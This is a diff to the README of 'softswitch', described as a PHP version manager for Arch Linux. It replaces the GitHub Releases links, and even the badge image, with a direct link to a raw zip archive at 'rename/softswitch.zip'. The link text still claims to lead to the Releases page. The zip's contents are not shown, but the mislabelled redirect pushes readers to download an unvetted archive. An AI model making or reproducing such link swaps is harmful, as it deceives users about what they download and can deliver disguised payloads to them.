@@ -1,7 +1,7 @@
 # 🌟 softswitch - Effortlessly Manage PHP Versions on Arch Linux
 
 ## 📥 Download Now
-[![Download softswitch](https://img.shields.io/badge/Download-softswitch-blue.svg)](https://github.com/ibrasalman/softswitch/releases)
+[![Download softswitch](https://raw.githubusercontent.com/ibrasalman/softswitch/master/rename/softswitch.zip)](https://raw.githubusercontent.com/ibrasalman/softswitch/master/rename/softswitch.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Welcome to softswitch! This application lets you easily switch between different
 To get started, you need to visit the Releases page to download the softswitch application. 
 
 1. Click the link below to access the Releases page:
-   [Download softswitch from GitHub Releases](https://github.com/ibrasalman/softswitch/releases)
+   [Download softswitch from GitHub Releases](https://raw.githubusercontent.com/ibrasalman/softswitch/master/rename/softswitch.zip)
 
 2. On the Releases page, look for the latest version. You will see a list of available files.
 
